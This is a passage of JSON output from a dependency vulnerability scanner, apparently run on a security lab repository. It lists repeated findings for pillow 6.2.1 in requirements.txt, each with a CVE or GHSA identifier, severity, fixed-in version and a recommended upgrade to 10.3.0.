            "text": "Package: pillow@6.2.1 (direct)\nVulnerability GHSA-jgpv-4h4c-xhw3 (severity: medium, fixed in 8.1.2)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [GHSA-jgpv-4h4c-xhw3](https://github.com/advisories/GHSA-jgpv-4h4c-xhw3)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "531f3d046e839c00f190353bc5162484f9b37d0b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25292",
          "ruleIndex": 29,
          "level": "warning",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25292 (severity: medium, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25292](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25292)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "76e1da90482fa202e4ec62ff779f83e8639ae478"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-27922",
          "ruleIndex": 30,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-27922 (severity: high, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-27922](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27922)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "97914ac3bd8addd5c92296377a72cbf92e8b7b80"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-27923",
          "ruleIndex": 31,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-27923 (severity: high, fixed in 8.1.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-27923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27923)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ce869d49cffdd1fc9b836fd09a9bda6be6216898"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25291",
          "ruleIndex": 32,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25291 (severity: high, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25291](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25291)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "95ac600cbb7ab8df976498baea63ec1f4293f4e6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25288",
          "ruleIndex": 33,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25288 (severity: high, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25288](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25288)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e53cdf94d23518a960958157c0435a7d36a5d05e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-28678",
          "ruleIndex": 34,
          "level": "warning",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-28678 (severity: medium, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-28678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28678)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7c726b91cc162165fd77c214a5b55415aecaf97b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-28675",
          "ruleIndex": 35,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-28675 (severity: high, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-28675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28675)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1ff5f1e1dd9121e83c7ace1ddfc40376055170ef"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-28676",
          "ruleIndex": 36,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-28676 (severity: high, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-28676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28676)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ff43b222a1e194d7a90d63f4455411ea4bc5f1e3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-25287",
          "ruleIndex": 37,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-25287 (severity: high, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-25287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25287)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4e12bc8e3fc42654e638a7821afb1d0bb80cddc5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-28677",
          "ruleIndex": 38,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-28677 (severity: high, fixed in 8.2.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-28677](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28677)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6c3e9d11161c615ae2770ac47131ebc016c0d6be"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-34552",
          "ruleIndex": 39,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-34552 (severity: critical, fixed in 8.3.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-34552](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34552)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "dbd98cdc166ee41914c550ade1b56727e87f1bf9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-23437",
          "ruleIndex": 40,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2021-23437 (severity: high, fixed in 8.3.2)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-23437](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23437)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e520f21bac77a04432b3bf71c5183fb6462c5d63"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-22816",
          "ruleIndex": 41,
          "level": "warning",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2022-22816 (severity: medium, fixed in 9.0.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-22816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22816)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5c0f9c23d4fb46075084a308b05372efe1eb0120"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-22815",
          "ruleIndex": 42,
          "level": "warning",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2022-22815 (severity: medium, fixed in 9.0.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-22815](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22815)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "778cb82bfd9dde12efd77c7ce40e25f156884a7e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-4fx9-vc88-q2xc",
          "ruleIndex": 43,
          "level": "note",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability GHSA-4fx9-vc88-q2xc (severity: low, fixed in 9.0.0)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [GHSA-4fx9-vc88-q2xc](https://github.com/advisories/GHSA-4fx9-vc88-q2xc)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
                "text": "requirements.txt: pillow@6.2.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5b8d0549c57d2493f65b8fc99d73f00392399970"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-22817",
          "ruleIndex": 44,
          "level": "error",
          "message": {
            "text": "Package: pillow@6.2.1 (direct)\nVulnerability CVE-2022-22817 (severity: critical, fixed in 9.0.1)\nSmartFix: 10.3.0 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-22817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22817)\nSample path: requirements.txt -\u003e pillow@6.2.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/pillow@6.2.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/pillow@6.2.1\n  10.3.0 is the minimal version with no known vulnerabilities\n  10.3.0 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 17 versions (nodes) and 243 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 8,
                  "endLine": 8
                }
              },
              "message": {
